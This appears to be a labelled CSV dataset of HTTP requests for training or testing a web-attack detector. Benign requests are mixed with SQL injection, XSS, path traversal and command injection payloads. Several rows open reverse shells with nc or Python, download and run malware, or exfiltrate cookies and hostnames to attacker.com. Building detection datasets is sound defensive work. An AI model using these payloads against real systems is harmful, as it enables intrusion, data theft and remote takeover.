request_text,label
"GET /search?q=gaming chair&page=9&sort=asc HTTP/1.1
Host: example.com",benign
"GET /tools?host=8.8.8.8| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"GET /api/auth?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| nc attacker.com 4444 -e /bin/bash",cmdi
"GET /files/data.csv HTTP/1.1
Host: example.com",benign
"GET /product?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /search?q=-moz-binding: url(http://attacker.com/xss.xml#xss) HTTP/1.1
Host: example.com",xss
"GET /debug?host=192.168.1.1; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"GET /search?q=gaming chair&page=3&sort=asc HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; INSERT INTO users (username,password) VALUES ('hacked','hacked')--&password=test",sqli
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /product/cat_clothing HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /api/execute?host=8.8.8.8; cat /etc/passwd HTTP/1.1
Host: example.com",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>alert(1)</script>&user=test",xss
"GET /static?file=../../../var/log/apache2/access.log HTTP/1.1
Host: example.com",traversal
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| id",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"GET /static?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 OR 1=1&password=test",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; DROP TABLE users; --&password=test",sqli
"GET /login?q=' OR '1'='1 HTTP/1.1
Host: example.com",sqli
"GET /files?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /search?q=<ScRiPt>alert(1)</ScRiPt> HTTP/1.1
Host: example.com",xss
"GET /run?host=test|| whoami HTTP/1.1
Host: example.com",cmdi
"GET /comment?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT table_name FROM information_schema.tables--&password=test",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT user()--&password=test",sqli
"GET /posts?q=<svg onload=prompt(document.domain)> HTTP/1.1
Host: example.com",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<xss style=xss:expression(alert(1))>&user=test",xss
"GET /feedback?q=<svg/onload=alert(1)> HTTP/1.1
Host: example.com",xss
"DELETE /api/cart/item/296 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"GET /orders HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"GET /profile?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /tools?host=localhost; id HTTP/1.1
Host: example.com",cmdi
"GET /user?q=' OR EXISTS(SELECT * FROM users WHERE username='admin')-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=....//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=';SELECT pg_sleep(5)--&password=test",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=prompt(1)>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"DELETE /api/cart/item/244 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /run?host=8.8.8.8; id HTTP/1.1
Host: example.com",cmdi
"GET /debug?host=check| dir C:\ HTTP/1.1
Host: example.com",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE users--&password=test",sqli
"GET /images?file=../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=....//..//etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /view?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=ivan&password=SecureP@ss1",benign
"GET /search?q=&#60;script&#62;alert(1)&#60;/script&#62; HTTP/1.1
Host: example.com",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<link rel=stylesheet href=javascript:alert(1)>&user=test",xss
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| ls -la /",cmdi
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1$(cat /etc/group)",cmdi
"GET /view?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /cart HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"PUT /api/users/alice HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""alice@email.com"",""name"":""Alice""}",benign
"GET /static?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /run?host=check$(whoami) HTTP/1.1
Host: example.com",cmdi
"GET /files?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /api/auth?q=0x27 OR 0x31=0x31-- HTTP/1.1
Host: example.com",sqli
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin' OR '1'='1' LIMIT 1--&password=test",sqli
"GET /posts?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/data?limit=40&offset=27&format=json HTTP/1.1
Host: example.com",benign
"GET /run?host=check| set HTTP/1.1
Host: example.com",cmdi
"GET /search?q=<xss style=xss:expression(alert(1))> HTTP/1.1
Host: example.com",xss
"GET /feedback?q=';alert(String.fromCharCode(88,83,83))// HTTP/1.1
Host: example.com",xss
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"GET /cart HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /search?q=gaming chair&page=10&sort=asc HTTP/1.1
Host: example.com",benign
"DELETE /api/cart/item/422 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /view?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=laptop&page=9&sort=asc HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>document.location='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /search?q=1' OR '1'='1'-- HTTP/1.1
Host: example.com",sqli
"GET /ping?host=check| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<div style='background:url(javascript:alert(1))'>&user=test",xss
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR 'x'='x&password=test",sqli
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg/onload=alert(1)>&user=test",xss
"GET /images?file=file:///etc/passwd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/632 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /user?q=' HAVING 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /checkout?q=1 OR 1=1-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=..\..\windows\system.ini HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=';alert(String.fromCharCode(88,83,83))//&user=test",xss
"GET /run?host=check$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"GET /posts?q=<embed src=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"DELETE /api/cart/item/318 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<ScRiPt>alert(1)</ScRiPt>&user=test",xss
"GET /product/cat_electronics HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /user?q=' AND 2>1-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=%2e%2e%2fetc%2fpasswd HTTP/1.1
Host: example.com",traversal
"GET /api/auth?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"GET /api/data?limit=55&offset=91&format=json HTTP/1.1
Host: example.com",benign
"GET /profile?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| find / -perm -4000 2>/dev/null",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ping -c 5 attacker.com",cmdi
"GET /debug?host=8.8.8.8| wget http://attacker.com/malware -O /tmp/m && chmod +x /tmp/m && /tmp/m HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null--&password=test",sqli
"GET /files?file=../../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /api/file?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /static?file=..%c0%afetc%c0%afpasswd HTTP/1.1
Host: example.com",traversal
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 AND updatexml(1,concat(0x7e,user()),1)--&password=test",sqli
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC master..xp_cmdshell('dir')--&password=test",sqli
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"GET /admin/login?q='; EXEC master..xp_cmdshell('dir')-- HTTP/1.1
Host: example.com",sqli
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; INSERT INTO users (username,password) VALUES ('hacked','hacked')--&password=test",sqli
"GET /user?q=1' AND 1=2-- HTTP/1.1
Host: example.com",sqli
"GET /product?q=admin'-- HTTP/1.1
Host: example.com",sqli
"DELETE /api/cart/item/201 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| cat /etc/shadow",cmdi
"GET /tools?host=localhost| uname -a HTTP/1.1
Host: example.com",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--&password=test",sqli
"POST /api/auth HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; WAITFOR DELAY '0:0:5'--&password=test",sqli
"GET /product?q=' AND 1=0 UNION SELECT '1','2','3'-- HTTP/1.1
Host: example.com",sqli
"GET /ping?host=check$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& env",cmdi
"GET /download?file=..%2F..%2Fetc%2Fpasswd HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<svg/onload=alert(1)>&user=test",xss
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment='; alert(1); var x='&user=test",xss
"POST /run HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check; printenv",cmdi
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<details open ontoggle=alert(1)>&user=test",xss
"GET /files?file=../../../etc/shadow HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=';alert(String.fromCharCode(88,83,83))//&user=test",xss
"GET /login?q=' OR EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=charlie&password=SecureP@ss1",benign
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT user()--&password=test",sqli
"GET /debug?host=192.168.1.1| ping attacker.com HTTP/1.1
Host: example.com",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; printenv",cmdi
"GET /search?q=1' GROUP BY 1-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /exec?host=check| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"GET /static?file=/../../boot.ini HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=-moz-binding: url(http://attacker.com/xss.xml#xss)&user=test",xss
"GET /download?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /user?q=1' OR '1'='1'-- HTTP/1.1
Host: example.com",sqli
"GET /login?q=1;SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"GET /tools?host=check|| whoami HTTP/1.1
Host: example.com",cmdi
"GET /admin/login?q=1' ORDER BY 1-- HTTP/1.1
Host: example.com",sqli
"GET /view?file=..\..\windows\system32 HTTP/1.1
Host: example.com",traversal
"GET /profile?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /files/manual.pdf HTTP/1.1
Host: example.com",benign
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"GET /search?q=<img src=x onerror=confirm(1)> HTTP/1.1
Host: example.com",xss
"GET /search?q=laptop&page=5&sort=asc HTTP/1.1
Host: example.com",benign
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=check| type C:\Windows\System32\drivers\etc\hosts",cmdi
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1|| whoami",cmdi
"GET /images?file=../../../../proc/self/environ HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1;SELECT pg_sleep(5)--&password=test",sqli
"POST /ping HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| set",cmdi
"GET /exec?host=localhost; nc -e /bin/sh attacker.com 4444 HTTP/1.1
Host: example.com",cmdi
"GET /admin/login?q=' AND SLEEP(5)-- HTTP/1.1
Host: example.com",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test; ls -la",cmdi
"GET /debug?host=192.168.1.1| uname -a HTTP/1.1
Host: example.com",cmdi
"GET /user?q=1 UNION SELECT version()-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1; DROP TABLE orders--&password=test",sqli
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| cat /etc/shadow",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' /*&password=test",sqli
"DELETE /api/cart/item/490 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=-moz-binding: url(http://attacker.com/xss.xml#xss)&user=test",xss
"GET /profile?q=<link rel=stylesheet href=javascript:alert(1)> HTTP/1.1
Host: example.com",xss
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| ping attacker.com",cmdi
"GET /images?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<ScRiPt>alert(1)</ScRiPt>&user=test",xss
"GET /ping?host=check$(id) HTTP/1.1
Host: example.com",cmdi
"GET /search?q=headphones&page=7&sort=asc HTTP/1.1
Host: example.com",benign
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<div style='background:url(javascript:alert(1))'>&user=test",xss
"GET /download?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /product?q='; INSERT INTO users (username,password) VALUES ('hacked','hacked')-- HTTP/1.1
Host: example.com",sqli
"GET /download?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /api/data?limit=10&offset=20&format=json HTTP/1.1
Host: example.com",benign
"GET /user?q=' UNION SELECT table_name FROM information_schema.tables-- HTTP/1.1
Host: example.com",sqli
"GET /api/file?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /product/brand_sony HTTP/1.1
Host: example.com
Accept: application/json",benign
"GET /files?file=%2e%2e/%2e%2e/etc/passwd HTTP/1.1
Host: example.com",traversal
"DELETE /api/cart/item/429 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /comment?q=<a href=javascript:alert(1)>click me</a> HTTP/1.1
Host: example.com",xss
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /profile?q=<audio src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /api/execute?host=check`whoami` HTTP/1.1
Host: example.com",cmdi
"GET /images?file=/etc/shadow HTTP/1.1
Host: example.com",traversal
"GET /images?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"GET /search?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<div style='background:url(javascript:alert(1))'>&user=test",xss
"GET /login?q=0x27 OR 0x31=0x31-- HTTP/1.1
Host: example.com",sqli
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<iframe onload=alert(1)>&user=test",xss
"GET /tools?host=192.168.1.1; ping -c 5 attacker.com HTTP/1.1
Host: example.com",cmdi
"DELETE /api/cart/item/498 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /run?host=localhost; id HTTP/1.1
Host: example.com",cmdi
"GET /static?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"GET /run?host=check; ls -la HTTP/1.1
Host: example.com",cmdi
"GET /static?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /images?file=../../../etc/hosts HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=alice&password=SecureP@ss1",benign
"POST /admin/login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; EXEC xp_cmdshell('whoami')--&password=test",sqli
"GET /download?file=../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=charlie&password=SecureP@ss1",benign
"GET /profile?q=<details open ontoggle=alert(1)> HTTP/1.1
Host: example.com",xss
"POST /comment HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<style>body{background:url('javascript:alert(1)')}</style>&user=test",xss
"GET /view?file=..%252f..%252fetc%252fpasswd HTTP/1.1
Host: example.com",traversal
"GET /checkout?q=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- HTTP/1.1
Host: example.com",sqli
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT table_name FROM information_schema.tables--&password=test",sqli
"GET /feedback?q=<video src=x onerror=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /files?file=php://filter/convert.base64-encode/resource=/etc/passwd HTTP/1.1
Host: example.com",traversal
"GET /search?q=expression(alert(1)) HTTP/1.1
Host: example.com",xss
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"GET /api/file?file=../../../../../../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<embed src=javascript:alert(1)>&user=test",xss
"GET /ping?host=check$(curl attacker.com/c2?h=$(hostname)) HTTP/1.1
Host: example.com",cmdi
"GET /exec?host=8.8.8.8| id HTTP/1.1
Host: example.com",cmdi
"POST /login HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=bob&password=SecureP@ss1",benign
"GET /debug?host=test| nc attacker.com 4444 -e /bin/bash HTTP/1.1
Host: example.com",cmdi
"PUT /api/users/frank HTTP/1.1
Host: example.com
Content-Type: application/json

{""email"":""frank@email.com"",""name"":""Frank""}",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=javascript:alert(1)&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<img src=x onerror=confirm(1)>&user=test",xss
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /posts?q=<svg onload=prompt(document.domain)> HTTP/1.1
Host: example.com",xss
"GET /files/invoice_2024.pdf HTTP/1.1
Host: example.com",benign
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8&& python -c 'import socket,subprocess,os;s=socket.socket();s.connect((""attacker.com"",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([""/bin/sh"",""-i""])'",cmdi
"GET /download?file=..%u2215etc%u2215passwd HTTP/1.1
Host: example.com",traversal
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1&& whoami",cmdi
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1' GROUP BY 1--&password=test",sqli
"GET /view?file=../etc/passwd HTTP/1.1
Host: example.com",traversal
"POST /posts HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<video src=x onerror=alert(1)>&user=test",xss
"GET /api/users/profile HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"GET /help HTTP/1.1
Host: example.com
Authorization: Bearer token_abc456",benign
"POST /exec HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost&& uname -a",cmdi
"GET /comment?q=<svg onload=alert(1)> HTTP/1.1
Host: example.com",xss
"GET /static?file=..%c1%9cetc%c1%9cpasswd HTTP/1.1
Host: example.com",traversal
"GET /posts?q=<script>new Image().src='http://attacker.com/?c='+document.cookie</script> HTTP/1.1
Host: example.com",xss
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' OR '1'='1' /*&password=test",sqli
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test",sqli
"GET /product/newest_arrivals HTTP/1.1
Host: example.com
Accept: application/json",benign
"POST /api/execute HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=8.8.8.8| dir C:\",cmdi
"DELETE /api/cart/item/392 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"POST /feedback HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<script>new Image().src='http://attacker.com/?c='+document.cookie</script>&user=test",xss
"GET /ping?host=localhost| type C:\Windows\System32\drivers\etc\hosts HTTP/1.1
Host: example.com",cmdi
"POST /product HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=admin'--&password=test",sqli
"GET /checkout?q=';SELECT pg_sleep(5)-- HTTP/1.1
Host: example.com",sqli
"POST /debug HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=test| nc attacker.com 4444 -e /bin/bash",cmdi
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=192.168.1.1| ping attacker.com",cmdi
"GET /files/photo.jpg HTTP/1.1
Host: example.com",benign
"GET /admin/login?q=1 AND updatexml(1,concat(0x7e,user()),1)-- HTTP/1.1
Host: example.com",sqli
"GET /checkout?q=1' AND (SELECT 1 FROM(SELECT COUNT(*),CONCAT(version(),FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)-- HTTP/1.1
Host: example.com",sqli
"POST /search HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=&#60;script&#62;alert(1)&#60;/script&#62;&user=test",xss
"GET /wishlist HTTP/1.1
Host: example.com
Authorization: Bearer bearer_987def",benign
"POST /checkout HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username='; DROP TABLE users; --&password=test",sqli
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<audio src=x onerror=alert(1)>&user=test",xss
"DELETE /api/cart/item/607 HTTP/1.1
Host: example.com
Authorization: Bearer token123",benign
"GET /download?file=/var/log/auth.log HTTP/1.1
Host: example.com",traversal
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=' UNION SELECT null--&password=test",sqli
"GET /tools?host=check$(cat /etc/group) HTTP/1.1
Host: example.com",cmdi
"POST /profile HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

comment=<object data=javascript:alert(1)>&user=test",xss
"POST /tools HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

cmd=localhost; whoami",cmdi
"GET /images?file=%5c..%5c..%5cwindows%5csystem32 HTTP/1.1
Host: example.com",traversal
"GET /login?q=' UNION SELECT null,null,null-- HTTP/1.1
Host: example.com",sqli
"GET /login?q=%27 OR %271%27=%271 HTTP/1.1
Host: example.com",sqli
"POST /user HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded

username=1 UNION SELECT @@datadir--&password=test",sqli
"GET /search?q=wireless mouse&page=6&sort=asc HTTP/1.1
Host: example.com",benign
"GET /search?q=python book&page=5&sort=asc HTTP/1.1
Host: example.com",benign
